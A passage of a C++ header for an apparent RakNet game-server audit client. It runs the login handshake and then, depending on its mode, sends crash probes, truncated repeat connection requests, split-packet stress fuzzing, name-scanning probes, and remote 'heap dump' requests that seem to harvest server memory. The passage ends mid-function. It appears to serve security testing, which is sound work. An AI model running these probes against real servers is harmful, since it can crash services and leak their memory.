#pragma once

#include "cache_unpacker.hpp"
#include "config.hpp"
#include "logger.hpp"
#include "raknet_utils.hpp"
#include "split_fuzzer.hpp"
#include "upper_packets.hpp"

#include "BitStream.h"
#include "InternalPacket.h"
#include "MessageIdentifiers.h"
#include "PluginInterface2.h"
#include "RakPeerInterface.h"
#include "RakNetVersion.h"

#include <atomic>
#include <algorithm>
#include <chrono>
#include <conio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <sstream>
#include <string>
#include <thread>
#include <vector>
#include <windows.h>

#include "heap_dump.hpp"

#pragma comment(lib, "ws2_32.lib")

namespace ragnarok
{
    inline constexpr const char* kBuildTag = "dns-host-first-fallback-2026-04-24";
    inline constexpr unsigned char kReply2DebugPacketId = 0xF0;

    enum class ConnState
    {
        Offline,
        Handshaking,
        Connected,
        Disconnecting,
        Disconnected
    };

    inline bool EnsureWinsock(std::string& err)
    {
        static int code = []()
        {
            WSADATA wsa = {};
            return WSAStartup(MAKEWORD(2, 2), &wsa);
        }();

        if(code == 0)
            return true;

        err = "WSAStartup failed, code=" + std::to_string(code);
        return false;
    }

    inline void AddUniqueHost(std::vector<std::string>& out, const std::string& host)
    {
        if(std::find(out.begin(), out.end(), host) == out.end())
            out.push_back(host);
    }

    inline bool ResolveHostIpv4All(const std::string& host, std::vector<std::string>& out, std::string& err)
    {
        out.clear();
        if(host.empty())
        {
            err = "empty host";
            return false;
        }

        if(!EnsureWinsock(err))
            return false;

        IN_ADDR addr = {};
        if(InetPtonA(AF_INET, host.c_str(), &addr) == 1)
        {
            out.push_back(host);
            return true;
        }

        addrinfo hints = {};
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_DGRAM;
        hints.ai_protocol = IPPROTO_UDP;

        AddUniqueHost(out, host);

        addrinfo* result = nullptr;
        int rc = getaddrinfo(host.c_str(), nullptr, &hints, &result);
        if(rc != 0 || result == nullptr)
        {
            err = "getaddrinfo failed, code=" + std::to_string(rc) + "; keeping raw host first";
            return true;
        }

        for(addrinfo* ai = result; ai != nullptr; ai = ai->ai_next)
        {
            if(ai->ai_family != AF_INET || ai->ai_addr == nullptr)
                continue;

            auto* sin = reinterpret_cast<sockaddr_in*>(ai->ai_addr);
            char text[INET_ADDRSTRLEN] = {};
            if(InetNtopA(AF_INET, &sin->sin_addr, text, sizeof(text)) != nullptr)
                AddUniqueHost(out, text);
        }

        freeaddrinfo(result);
        return true;
    }

    inline const char* RakNetPacketName(unsigned char id)
    {
        switch(id)
        {
            case ID_UNCONNECTED_PING:
                return "ID_UNCONNECTED_PING";
            case ID_UNCONNECTED_PING_OPEN_CONNECTIONS:
                return "ID_UNCONNECTED_PING_OPEN_CONNECTIONS";
            case ID_UNCONNECTED_PONG:
                return "ID_UNCONNECTED_PONG";
            case ID_OPEN_CONNECTION_REQUEST_1:
                return "ID_OPEN_CONNECTION_REQUEST_1";
            case ID_OPEN_CONNECTION_REPLY_1:
                return "ID_OPEN_CONNECTION_REPLY_1";
            case ID_OPEN_CONNECTION_REQUEST_2:
                return "ID_OPEN_CONNECTION_REQUEST_2";
            case ID_OPEN_CONNECTION_REPLY_2:
                return "ID_OPEN_CONNECTION_REPLY_2";
            case ID_CONNECTION_REQUEST:
                return "ID_CONNECTION_REQUEST";
            case ID_CONNECTION_REQUEST_ACCEPTED:
                return "ID_CONNECTION_REQUEST_ACCEPTED";
            case ID_NEW_INCOMING_CONNECTION:
                return "ID_NEW_INCOMING_CONNECTION";
            case ID_NO_FREE_INCOMING_CONNECTIONS:
                return "ID_NO_FREE_INCOMING_CONNECTIONS";
            case ID_DISCONNECTION_NOTIFICATION:
                return "ID_DISCONNECTION_NOTIFICATION";
            case ID_CONNECTION_LOST:
                return "ID_CONNECTION_LOST";
            case ID_CONNECTION_BANNED:
                return "ID_CONNECTION_BANNED";
            case ID_INVALID_PASSWORD:
                return "ID_INVALID_PASSWORD";
            case ID_INCOMPATIBLE_PROTOCOL_VERSION:
                return "ID_INCOMPATIBLE_PROTOCOL_VERSION";
            case ID_IP_RECENTLY_CONNECTED:
                return "ID_IP_RECENTLY_CONNECTED";
            case ID_CONNECTION_ATTEMPT_FAILED:
                return "ID_CONNECTION_ATTEMPT_FAILED";
            default:
                return "UNKNOWN";
        }
    }

    class WiretapPlugin final : public RakNet::PluginInterface2
    {
    public:
        void SetLogger(Logger* in_log, bool in_audit_internal = false)
        {
            log = in_log;
            audit_internal = in_audit_internal;
        }

        bool UsesReliabilityLayer() const override
        {
            return true;
        }

        void OnDirectSocketSend(const char* data, const RakNet::BitSize_t bits_used, RakNet::SystemAddress remote) override
        {
            PushWire("tx", data, bits_used, remote);
        }

        void OnDirectSocketReceive(const char* data, const RakNet::BitSize_t bits_used, RakNet::SystemAddress remote) override
        {
            PushWire("rx", data, bits_used, remote);
        }

        void OnInternalPacket(RakNet::InternalPacket* packet, unsigned, RakNet::SystemAddress,
            RakNet::TimeMS, int is_send) override
        {
            if(!audit_internal || log == nullptr || packet == nullptr || packet->data == nullptr || packet->dataBitLength == 0)
                return;

            size_t bytes = (static_cast<size_t>(packet->dataBitLength) + 7) / 8;
            if(packet->data[0] != ID_CONNECTION_REQUEST && packet->data[0] != ID_CONNECTION_REQUEST_ACCEPTED)
                return;

            log->Push(LogLevel::Network, std::string("audit internal ") + (is_send ? "tx" : "rx")
                + " id=" + std::to_string(packet->data[0])
                + " bits=" + std::to_string(packet->dataBitLength)
                + " hex=" + ToHex(packet->data, bytes, 256));
        }

        void OnReliabilityLayerNotification(const char* error_message, const RakNet::BitSize_t bits_used, RakNet::SystemAddress remote, bool is_error) override
        {
            if(log == nullptr || error_message == nullptr || !is_error)
                return;

            std::ostringstream oss;
            oss << "reliability " << (is_error ? "error" : "note")
                << ", bytes=" << ((static_cast<size_t>(bits_used) + 7) / 8)
                << ", addr=" << FormatSystemAddress(remote)
                << ", msg=" << error_message;
            log->Push(is_error ? LogLevel::Error : LogLevel::Warn, oss.str());
        }

    private:
        Logger* log = nullptr;
        bool audit_internal = false;

        void PushWire(const char* dir, const char* data, const RakNet::BitSize_t bits_used, RakNet::SystemAddress remote)
        {
            if(log == nullptr || data == nullptr || bits_used == 0)
                return;

            size_t bytes = (static_cast<size_t>(bits_used) + 7) / 8;
            unsigned char id = static_cast<unsigned char>(data[0]);

            if(id != ID_UNCONNECTED_PING &&
                id != ID_OPEN_CONNECTION_REQUEST_1 &&
                id != ID_OPEN_CONNECTION_REPLY_1 &&
                id != ID_OPEN_CONNECTION_REQUEST_2 &&
                id != ID_OPEN_CONNECTION_REPLY_2)
            {
                return;
            }

            std::ostringstream oss;
            oss << "wire " << dir
                << " id=0x" << std::hex << std::uppercase << std::setw(2) << std::setfill('0') << static_cast<int>(id)
                << " (" << RakNetPacketName(id) << ")"
                << ", bytes=" << std::dec << bytes
                << ", addr=" << FormatSystemAddress(remote);
            log->Push(LogLevel::Network, oss.str());
        }
    };

    class RagnarokClient
    {
    public:
        RagnarokClient() = default;

        ~RagnarokClient()
        {
            Shutdown();
        }

        bool Init(Logger&& lg, const RuntimeConfig& in_cfg, const std::string& override_server)
        {
            log = std::move(lg);
            cfg = in_cfg;

            if(!override_server.empty())
                cfg.server = override_server;

            NormalizeIdentity(cfg);

            if(cfg.audit_probe == "repo_event_scan")
            {
                if(cfg.event_scan_file.empty())
                    cfg.event_scan_file = ExeDir() / "repo-event-names.txt";
                std::ifstream names(cfg.event_scan_file, std::ios::binary);
                if(!names)
                {
                    log.Push(LogLevel::Error, "cannot open event scan list: " + cfg.event_scan_file.string());
                    return false;
                }
                std::string line;
                while(std::getline(names, line))
                {
                    line = Trim(line);
                    if(line.empty() || line[0] == '#')
                        continue;
                    if(line.size() > 128 || std::find(event_scan_names.begin(), event_scan_names.end(), line) != event_scan_names.end())
                        continue;
                    event_scan_names.push_back(line);
                    if(event_scan_names.size() > 2048)
                    {
                        log.Push(LogLevel::Error, "event scan list exceeds 2048 names");
                        return false;
                    }
                }
                log.Status("REPO_SCAN loaded names=" + std::to_string(event_scan_names.size())
                    + " interval_ms=" + std::to_string(cfg.event_scan_interval_ms)
                    + " claimed_bytes=" + std::to_string(cfg.event_scan_claimed_bytes));
                if(event_scan_names.empty() && cfg.event_scan_claimed_bytes > 256)
                    scan_preflight_index = 3;
            }

            std::string host;
            unsigned short port = 0;
            if(!ParseIpPort(cfg.server, host, port))
            {
                log.Push(LogLevel::Error, "bad server format, expected ip:port");
                return false;
            }

            std::string resolve_error;
            server_host = host;
            server_port = port;
            if(cfg.audit_probe == "heap_dump" || cfg.audit_probe == "heap_dump_remote" ||
                cfg.audit_probe == "biz_order_dump_remote")
            {
                if(cfg.heap_dump_bytes == 0 || cfg.heap_dump_bytes > 65535 ||
                    (cfg.audit_probe == "biz_order_dump_remote" && cfg.heap_dump_bytes < 8) ||
                    cfg.heap_dump_interval_ms < (cfg.audit_probe == "biz_order_dump_remote" ? 500u : 10u) ||
                    cfg.heap_dump_interval_ms > 3600000)
                {
                    log.Push(LogLevel::Error, "heap dump size or interval out of range");
                    return false;
                }
                if(cfg.heap_dump_dir.empty())
                    cfg.heap_dump_dir = ExeDir() / "heap-dumps";
                if(!heap_dump_collector.Init(log, cfg.heap_dump_dir, cfg.heap_dump_bytes,
                    cfg.audit_probe == "biz_order_dump_remote"))
                    return false;
            }
            connect_host_index = 0;
            if(!ResolveHostIpv4All(server_host, connect_hosts, resolve_error))
            {
                log.Push(LogLevel::Error, "server host resolve failed: " + host + ", " + resolve_error);
                return false;
            }

            if(connect_hosts.size() > 1 || connect_hosts[0] != host)
            {
                std::ostringstream resolved;
                resolved << "server host resolved: " << host << " -> ";
                for(size_t i = 0; i < connect_hosts.size(); ++i)
                {
                    if(i)
                        resolved << ", ";
                    resolved << connect_hosts[i];
                }
                log.Push(LogLevel::Network, resolved.str());
            }

            peer = RakNet::RakPeerInterface::GetInstance();
            if(peer == nullptr)
            {
                log.Push(LogLevel::Error, "RakPeerInterface::GetInstance() failed");
                return false;
            }

            wiretap.SetLogger(&log, cfg.audit_probe == "conn09" || cfg.audit_probe == "conn09_seed");
            peer->AttachPlugin(&wiretap);
            peer->SetUserUpdateThread(&RagnarokClient::RakNetUpdateThunk, this);

            RakNet::SocketDescriptor socket_descriptor(0, nullptr);
            socket_descriptor.socketFamily = AF_INET;

            auto startup = peer->Startup(1, &socket_descriptor, 1);
            if(startup != RakNet::RAKNET_STARTED)
            {
                log.Push(LogLevel::Error, "RakNet Startup failed, code=" + std::to_string(static_cast<int>(startup)));
                return false;
            }

            peer->SetMaximumIncomingConnections(0);
            peer->AllowConnectionResponseIPMigration(false);
            peer->SetOccasionalPing(true);

            local_port = peer->GetInternalID().GetPort();

            public_key.publicKeyMode = RakNet::PKM_ACCEPT_ANY_PUBLIC_KEY;
            public_key.remoteServerPublicKey = nullptr;
            public_key.myPublicKey = nullptr;
            public_key.myPrivateKey = nullptr;

            log.Push(LogLevel::Info, std::string("build tag: ") + kBuildTag);
            if(!StartConnectionAttempt())
                return false;

            return true;
        }

        int Run()
        {
            while(true)
            {
                if(_kbhit())
                {
                    int c = _getch();
                    if(c == 27 || c == 'q' || c == 'Q')
                    {
                        stop_split_stress.store(true, std::memory_order_relaxed);
                        log.Push(LogLevel::Warn, "exit by user");
                        break;
                    }
                }

                Pump();

                if(IsHashScanMode() && hash_scan_done_at != std::chrono::steady_clock::time_point{} &&
                    std::chrono::steady_clock::now() >= hash_scan_done_at)
                {
                    log.Status("HASH_SCAN complete count=" + std::to_string(hash_scan_index));
                    break;
                }

                if(state == ConnState::Connected)
                {
                    if(!auth_hello_sent)
                    {
                        SendAuthHello();
                    }
                    else if(auth_result_received && !join_packets_sent)
                    {
                        SendIdentity();
                        join_packets_sent = true;
                    }
                    else if(server_bootstrap_received && !cache_dump_started)
                    {
                        if(!IsHashScanMode() && cfg.audit_probe != "biz_order_dump_remote")
                            StartCacheDump();
                        cache_dump_started = true;
                    }
                    else if(server_bootstrap_received && !state_ack_sent)
                    {
                        SendStateAck();
                        SendReady();
                        state_ack_sent = true;
                    }
                    else if(state_ack_sent && !audit_probe_sent && cfg.audit_probe == "blob256_short_pre_spawn")
                    {
                        SendAuditProbe();
                        audit_probe_sent = true;
                    }
                    else if(state_ack_sent && !audit_probe_sent &&
                        (cfg.audit_probe == "heap_dump_remote" ||
                         cfg.audit_probe == "biz_order_dump_remote" && identity_ack_received))
                    {
                        next_heap_dump_send = std::chrono::steady_clock::now();
                        audit_probe_sent = true;
                        log.Status(cfg.audit_probe == "biz_order_dump_remote"
                            ? "BIZ_ORDER_DUMP connected and ready"
                            : "HEAP_DUMP_REMOTE connected and ready");
                    }
                    else if(spawn_packet_received && !spawn_notify_sent)
                    {
                        SendSpawnLifecycle();
                        spawn_notify_sent = true;
                        if(cfg.audit_probe == "heap_dump")
                        {
                            next_heap_dump_send = std::chrono::steady_clock::now();
                            audit_probe_sent = true;
                            log.Status("HEAP_DUMP connected and ready");
                        }
                        else if(!audit_probe_sent && !cfg.audit_probe.empty() && !IsHashScanMode())
                        {
                            SendAuditProbe();
                            audit_probe_sent = true;
                        }
                    }
                    else if(cfg.audit_probe == "repo_event_scan" && state_ack_sent && identity_ack_received &&
                        scan_preflight_index < 4 && std::chrono::steady_clock::now() >= next_hash_scan_send)
                    {
                        SendRepoPreflight();
                        next_hash_scan_send = std::chrono::steady_clock::now() + std::chrono::milliseconds(1500);
                    }
                    else if(IsHashScanMode() && state_ack_sent && identity_ack_received &&
                        (cfg.audit_probe != "repo_event_scan" || scan_preflight_index == 4) &&
                        hash_scan_done_at == std::chrono::steady_clock::time_point{} &&
                        std::chrono::steady_clock::now() >= next_hash_scan_send)
                    {
                        SendHashEchoScanProbe();
                        next_hash_scan_send = std::chrono::steady_clock::now()
                            + std::chrono::milliseconds(cfg.audit_probe == "repo_event_scan" ? cfg.event_scan_interval_ms : 1500);
                    }
                    else if((cfg.audit_probe == "heap_dump" && spawn_notify_sent ||
                             cfg.audit_probe == "heap_dump_remote" && state_ack_sent ||
                             cfg.audit_probe == "biz_order_dump_remote" && state_ack_sent && identity_ack_received)
                        && audit_probe_sent &&
                        std::chrono::steady_clock::now() >= next_heap_dump_send)
                    {
                        SendHeapDumpProbe();
                        next_heap_dump_send = std::chrono::steady_clock::now()
                            + std::chrono::milliseconds(cfg.heap_dump_interval_ms);
                    }
                    else if(spawn_notify_sent && !crash_probes_sent && cfg.audit_probe.empty())
                    {
                        SendCrashProbes();
                        crash_probes_sent = true;
                    }
                    else if(cfg.split_stress && spawn_notify_sent && crash_probes_sent && !normal_remote_event_sent)
                    {
                        SendNormalRemoteEvent();
                        normal_remote_event_sent = true;
                    }
                    else if(cfg.split_stress && normal_remote_event_sent && !split_stress_started)
                    {
                        StartSplitStress();
                        split_stress_started = true;
                    }
                }
                else if(state == ConnState::Disconnected)
                {
                    stop_split_stress.store(true, std::memory_order_relaxed);
                    if(cfg.audit_probe != "heap_dump" && cfg.audit_probe != "heap_dump_remote" &&
                        cfg.audit_probe != "biz_order_dump_remote")
                        break;

                    auto now = std::chrono::steady_clock::now();
                    if(next_heap_dump_reconnect == std::chrono::steady_clock::time_point{})
                    {
                        next_heap_dump_reconnect = now + std::chrono::seconds(5);
                        log.Status("HEAP_DUMP disconnected; retrying connection in 5 seconds");
                    }
                    else if(now >= next_heap_dump_reconnect)
                    {
                        server_address = RakNet::UNASSIGNED_SYSTEM_ADDRESS;
                        connect_host_index = 0;
                        if(StartConnectionAttempt())
                            next_heap_dump_reconnect = {};
                        else
                            next_heap_dump_reconnect = now + std::chrono::seconds(5);
                    }
                }

                Sleep(30);
            }

            return 0;
        }

    private:
        Logger log;
        RuntimeConfig cfg;
        RakNet::RakPeerInterface* peer = nullptr;
        RakNet::PublicKey public_key = {};
        WiretapPlugin wiretap;
        RakNet::SystemAddress server_address = RakNet::UNASSIGNED_SYSTEM_ADDRESS;
        ConnState state = ConnState::Offline;
        std::string server_host;
        unsigned short server_port = 0;
        std::vector<std::string> connect_hosts;
        size_t connect_host_index = 0;
        uint16_t local_port = 0;
        bool auth_hello_sent = false;
        bool auth_result_received = false;
        bool identity_ack_received = false;
        bool server_bootstrap_received = false;
        bool join_packets_sent = false;
        bool state_ack_sent = false;
        bool spawn_packet_received = false;
        bool spawn_notify_sent = false;
        bool cache_dump_started = false;
        bool normal_remote_event_sent = false;
        bool split_stress_started = false;
        bool pre_auth_probe_sent = false;
        bool crash_probes_sent = false;
        bool audit_probe_sent = false;
        uint64_t heap_dump_requests = 0;
        std::chrono::steady_clock::time_point next_heap_dump_send = {};
        std::chrono::steady_clock::time_point next_heap_dump_reconnect = {};
        HeapDumpCollector heap_dump_collector;
        std::vector<std::string> event_scan_names;
        size_t scan_preflight_index = 0;
        size_t hash_scan_index = 0;
        std::chrono::steady_clock::time_point next_hash_scan_send = {};
        std::chrono::steady_clock::time_point hash_scan_done_at = {};
        bool update_thread_split_stress = false;
        split_fuzzer::State update_thread_split_state;
        std::vector<unsigned char> update_thread_split_payload;
        std::atomic_bool stop_split_stress = false;
        std::thread split_stress_thread;

        void Shutdown()
        {
            StopSplitStress();

            if(peer != nullptr)
            {
                peer->DetachPlugin(&wiretap);
                peer->Shutdown(300);
                RakNet::RakPeerInterface::DestroyInstance(peer);
                peer = nullptr;
            }
        }

        void Pump()
        {
            for(RakNet::Packet* packet = peer->Receive(); packet; peer->DeallocatePacket(packet), packet = peer->Receive())
            {
                HandlePacket(*packet);
            }
        }

        static void RakNetUpdateThunk(RakNet::RakPeerInterface*, void* data)
        {
            if(data == nullptr)
                return;

            static_cast<RagnarokClient*>(data)->OnRakNetUpdate();
        }

        void OnRakNetUpdate()
        {
            if(!update_thread_split_stress || stop_split_stress.load(std::memory_order_relaxed))
                return;

            uint32_t budget = split_fuzzer::ClientQueueLimit(cfg);
            if(budget == 0)
                budget = 2048;
            budget = std::min<uint32_t>(budget, 8192);

            split_fuzzer::PumpPreallocQueued(
                log,
                peer,
                server_address,
                update_thread_split_state,
                cfg,
                stop_split_stress,
                update_thread_split_payload,
                budget);
        }

        void HandlePacket(const RakNet::Packet& packet)
        {
            unsigned char id = GetPacketIdentifier(&packet);

            switch(id)
            {
                case ID_CONNECTION_REQUEST_ACCEPTED:
                {
                    log.Push(LogLevel::Network, "audit accepted payload: " + ToHex(packet.data, packet.length, 256));
                    if((cfg.audit_probe == "conn09" || cfg.audit_probe == "conn09_seed") && audit_probe_sent)
                    {
                        log.Status("AUDIT conn09 repeat accepted");
                        break;
                    }
                    state = ConnState::Connected;
                    server_address = packet.systemAddress;
                    auth_hello_sent = false;
                    auth_result_received = false;
                    identity_ack_received = false;
                    server_bootstrap_received = false;
                    join_packets_sent = false;
                    state_ack_sent = false;
                    spawn_packet_received = false;
                    spawn_notify_sent = false;
                    cache_dump_started = false;
                    normal_remote_event_sent = false;
                    split_stress_started = false;
                    pre_auth_probe_sent = false;
                    crash_probes_sent = false;
                    audit_probe_sent = false;
                    stop_split_stress.store(false, std::memory_order_relaxed);

                    log.Push(LogLevel::Success, "ID_CONNECTION_REQUEST_ACCEPTED from " + FormatSystemAddress(packet.systemAddress));
                    log.Status("CONNECT ID_CONNECTION_REQUEST_ACCEPTED");
                    log.Push(LogLevel::Info, std::string("remote guid=") + packet.guid.ToString());
                    log.Push(LogLevel::Info, "external address=" + FormatSystemAddress(peer->GetExternalID(packet.systemAddress)));

                    if((cfg.audit_probe == "conn09" || cfg.audit_probe == "conn09_seed") && !audit_probe_sent)
                    {
                        if(cfg.audit_probe == "conn09_seed")
                        {
                            RakNet::BitStream seed;
                            seed.Write(static_cast<unsigned char>(ID_CONNECTION_REQUEST));
                            for(int i = 0; i < 24; ++i)
                                seed.Write(static_cast<unsigned char>(0));
                            WriteU64LE(seed, 0x1122334455667788ULL);
                            SendBitStream(seed, "audit conn09 known-value seed", IMMEDIATE_PRIORITY);
                            Sleep(400);
                        }
                        RakNet::BitStream bs;
                        bs.Write(static_cast<unsigned char>(ID_CONNECTION_REQUEST));
                        SendBitStream(bs, "audit conn09 short repeat", IMMEDIATE_PRIORITY);
                        audit_probe_sent = true;
                        log.Status("AUDIT conn09 short repeat sent");
                    }

                    break;
                }
                case ID_CONNECTION_ATTEMPT_FAILED:
                {
                    if(TryNextConnectHost("ID_CONNECTION_ATTEMPT_FAILED"))
                        break;

                    state = ConnState::Disconnected;
                    log.Push(LogLevel::Error, "ID_CONNECTION_ATTEMPT_FAILED, len=" + std::to_string(packet.length));
                    log.Status("DISCONNECT ID_CONNECTION_ATTEMPT_FAILED");
                    if(packet.length > 1)
                        log.Push(LogLevel::Network, "attempt-failed payload: " + ToHex(packet.data, packet.length));
                    break;
                }
                case ID_ALREADY_CONNECTED:
                {
                    log.Push(LogLevel::Warn, "ID_ALREADY_CONNECTED");
                    break;
                }
                case ID_NO_FREE_INCOMING_CONNECTIONS:
                {
                    state = ConnState::Disconnected;
                    log.Push(LogLevel::Warn, "ID_NO_FREE_INCOMING_CONNECTIONS");
                    log.Status("DISCONNECT ID_NO_FREE_INCOMING_CONNECTIONS");
                    break;
                }
                case ID_CONNECTION_BANNED:
                {
                    state = ConnState::Disconnected;
                    log.Push(LogLevel::Warn, "ID_CONNECTION_BANNED");
                    log.Status("DISCONNECT ID_CONNECTION_BANNED");
                    break;
                }
                case ID_INVALID_PASSWORD:
                {
                    state = ConnState::Disconnected;
                    log.Push(LogLevel::Warn, "ID_INVALID_PASSWORD");
                    log.Status("DISCONNECT ID_INVALID_PASSWORD");
                    break;
                }
                case ID_INCOMPATIBLE_PROTOCOL_VERSION:
                {
                    state = ConnState::Disconnected;
                    std::string msg = "ID_INCOMPATIBLE_PROTOCOL_VERSION";
                    if(packet.length > 1)
                    {
                        msg += ", remote_version=" + std::to_string(static_cast<unsigned char>(packet.data[1]));
                    }
                    log.Push(LogLevel::Error, msg);
                    log.Status("DISCONNECT ID_INCOMPATIBLE_PROTOCOL_VERSION");
                    break;
                }
                case ID_REMOTE_SYSTEM_REQUIRES_PUBLIC_KEY:
                {
                    state = ConnState::Disconnected;
                    log.Push(LogLevel::Warn, "ID_REMOTE_SYSTEM_REQUIRES_PUBLIC_KEY");
                    log.Status("DISCONNECT ID_REMOTE_SYSTEM_REQUIRES_PUBLIC_KEY");
                    if(packet.length > 1)
                        log.Push(LogLevel::Network, "remote-system-requires-public-key payload: " + ToHex(packet.data, packet.length));
                    break;
                }
                case ID_OUR_SYSTEM_REQUIRES_SECURITY:
                {
                    state = ConnState::Disconnected;
                    log.Push(LogLevel::Warn, "ID_OUR_SYSTEM_REQUIRES_SECURITY");
                    log.Status("DISCONNECT ID_OUR_SYSTEM_REQUIRES_SECURITY");
                    if(packet.length > 1)
                        log.Push(LogLevel::Network, "our-system-requires-security payload: " + ToHex(packet.data, packet.length));
                    break;
                }
                case ID_PUBLIC_KEY_MISMATCH:
                {
                    state = ConnState::Disconnected;
                    log.Push(LogLevel::Warn, "ID_PUBLIC_KEY_MISMATCH");
                    log.Status("DISCONNECT ID_PUBLIC_KEY_MISMATCH");
                    if(packet.length > 1)
                        log.Push(LogLevel::Network, "public-key-mismatch payload: " + ToHex(packet.data, packet.length));
                    break;
                }
                case ID_DISCONNECTION_NOTIFICATION:
                {
                    state = ConnState::Disconnected;
                    log.Push(LogLevel::Warn, "ID_DISCONNECTION_NOTIFICATION");
                    log.Status("DISCONNECT ID_DISCONNECTION_NOTIFICATION");
                    if(packet.length > 1)
                        log.Push(LogLevel::Network, "disconnect payload: " + ToHex(packet.data, packet.length));
                    break;
                }
                case ID_CONNECTION_LOST:
                {
                    state = ConnState::Disconnected;
                    log.Push(LogLevel::Warn, "ID_CONNECTION_LOST");
                    log.Status("DISCONNECT ID_CONNECTION_LOST");
                    if(packet.length > 1)
                        log.Push(LogLevel::Network, "connection-lost payload: " + ToHex(packet.data, packet.length));
                    break;
                }
                case kReply2DebugPacketId:
                {
                    unsigned code = packet.length > 1 ? static_cast<unsigned char>(packet.data[1]) : 0;
                    std::ostringstream oss;
                    oss << "reply2-debug code=0x" << std::hex << std::uppercase << std::setw(2) << std::setfill('0') << code;
                    if(packet.length > 0)
                        oss << ", raw=" << ToHex(packet.data, packet.length);
                    log.Push(LogLevel::Network, oss.str());
                    break;
                }
                case ID_CONNECTED_PING:
                {
                    log.Push(LogLevel::Info, "ID_CONNECTED_PING");
                    break;
                }
                case ID_CONNECTED_PONG:
                {
                    log.Push(LogLevel::Info, "ID_CONNECTED_PONG");
                    break;
                }
                case ID_UNCONNECTED_PONG:
                {
                    log.Push(LogLevel::Info, "ID_UNCONNECTED_PONG from " + FormatSystemAddress(packet.systemAddress));
                    if(packet.length > 0)
                        log.Push(LogLevel::Network, "unconnected pong payload: " + ToHex(packet.data, packet.length));
                    break;
                }
                default:
                {
                    if(id == kUpperPacketId)
                    {
                        uint16_t family = 0xFFFF;
                        if(packet.length >= 3)
                        {
                            family = static_cast<uint16_t>(static_cast<unsigned char>(packet.data[1]))
                                | (static_cast<uint16_t>(static_cast<unsigned char>(packet.data[2])) << 8);

                            if(family == UPG_AUTH_RESULT)
                            {
                                auth_result_received = true;
                                log.Push(LogLevel::Success, "upper auth result received, auth phase looks alive");
                                log.Status("AUTH upper auth result received");
                            }
                            else if(family == UPG_AUTH_HELLO)
                            {
                                server_bootstrap_received = true;
                                log.Push(LogLevel::Success, "upper server bootstrap packet 0x03 received");
                                log.Status("BOOTSTRAP upper 0x03 received");
                            }
                            else if(family == UPG_IDENTITY_ACK)
                            {
                                identity_ack_received = true;
                                log.Status("HASH_SCAN identity ack received");
                            }
                            else if(family == UPG_SPAWN && packet.length > 3)
                            {
                                spawn_packet_received = true;
                                log.Push(LogLevel::Success, "upper server spawn payload received");
                                log.Status("SPAWN upper spawn payload received");
                            }
                        }

                        if(cfg.audit_probe == "biz_order_dump_remote")
                        {
                            if(family == UPG_REMOTE_EVENT)
                                heap_dump_collector.HandleUpper(
                                    reinterpret_cast<const unsigned char*>(packet.data), packet.length);
                        }
                        else if(IsHashScanMode() && family == UPG_REMOTE_EVENT)
                        {
                            LogHashScanIncoming(reinterpret_cast<const unsigned char*>(packet.data), packet.length);
                        }
                        else if((cfg.audit_probe != "heap_dump" && cfg.audit_probe != "heap_dump_remote") ||
                            !heap_dump_collector.HandleUpper(
                                reinterpret_cast<const unsigned char*>(packet.data), packet.length))
                        {
                            upper::HandleUpperPacket(log,
                                reinterpret_cast<const unsigned char*>(packet.data), packet.length);
                        }
                    }
                    else
                    {
                        std::ostringstream oss;
                        oss << "raknet packet id=0x" << std::hex << std::uppercase << static_cast<int>(id)
                            << ", len=" << std::dec << packet.length;
                        log.Push(LogLevel::Network, oss.str());
                        log.Push(LogLevel::Network, "raw: " + ToHex(packet.data, packet.length));
                    }
                    break;
                }
            }
        }

        void SendBitStream(RakNet::BitStream& bs, const std::string& tag, PacketPriority priority = HIGH_PRIORITY)
        {
            if(server_address == RakNet::UNASSIGNED_SYSTEM_ADDRESS)
                return;

            peer->Send(&bs, priority, RELIABLE_ORDERED, 0, server_address, false);
            log.Push(LogLevel::Network, tag + ", bytes=" + std::to_string(bs.GetNumberOfBytesUsed()));
        }

        bool StartConnectionAttempt()
        {
            if(peer == nullptr || connect_host_index >= connect_hosts.size())
                return false;

            const std::string& connect_host = connect_hosts[connect_host_index];
            bool ping_started = peer->Ping(connect_host.c_str(), server_port, false);
            log.Push(LogLevel::Network, "raknet Ping() " + std::string(ping_started ? "queued" : "failed") + " to " + connect_host);

            const char* password_data = cfg.password.empty() ? nullptr : cfg.password.c_str();
            int password_length = static_cast<int>(cfg.password.size());
            auto attempt = peer->Connect(connect_host.c_str(), server_port, password_data, password_length, &public_key);
            if(attempt != RakNet::CONNECTION_ATTEMPT_STARTED)
            {
                log.Push(LogLevel::Error, "RakNet Connect failed, code=" + std::to_string(static_cast<int>(attempt)) + ", host=" + connect_host);
                return false;
            }

            state = ConnState::Handshaking;

            std::ostringstream oss;
            oss << "server target: " << cfg.server
                << ", connect_host=" << connect_host
                << ", attempt=" << (connect_host_index + 1) << "/" << connect_hosts.size()
                << ", local_port=" << local_port;
            log.Push(LogLevel::Info, oss.str());
            log.Status("INIT " + oss.str());
            log.Push(LogLevel::Network, "raknet Connect() started, protocol=" + std::to_string(RAKNET_PROTOCOL_VERSION) + ", security=accept-any-public-key");
            return true;
        }

        bool TryNextConnectHost(const std::string& reason)
        {
            while(connect_host_index + 1 < connect_hosts.size())
            {
                ++connect_host_index;
                const std::string& connect_host = connect_hosts[connect_host_index];
                log.Push(LogLevel::Warn, reason + ", retrying DNS address " + std::to_string(connect_host_index + 1) + "/" + std::to_string(connect_hosts.size()) + ": " + connect_host);
                log.Status("RETRY " + reason + " next_host=" + connect_host);
                if(StartConnectionAttempt())
                    return true;
            }

            return false;
        }

        void SendIdentity()
        {
            RakNet::BitStream bs;
            WriteIdentityPacket(bs, cfg, local_port);
            SendBitStream(bs, "send upper identity packet 0xD2 0x38");
            log.Push(LogLevel::Success, "identity packet sent as 0x38");
        }

        void SendAuthHello()
        {
            RakNet::BitStream bs;
            WriteAuthHelloPacket(bs, cfg);
            SendBitStream(bs, "send upper auth hello packet 0xD2 0x03");
            auth_hello_sent = true;
        }

        void SendReady()
        {
            RakNet::BitStream bs;
            WriteReadyPacket(bs);
            SendBitStream(bs, "send upper ready packet 0xD2 0x05");
        }

        void SendStateAck()
        {
            RakNet::BitStream bs;
            WriteStateAckPacket(bs);
            SendBitStream(bs, "send upper state ack packet 0xD2 0x14");
        }

        void SendSpawnLifecycle()
        {
            RakNet::BitStream bs;
            WriteSpawnLifecyclePacket(bs);
            SendBitStream(bs, "send upper spawn notify packet 0xD2 0x15");
        }

        void SendNormalRemoteEvent()
        {
            RakNet::BitStream bs;
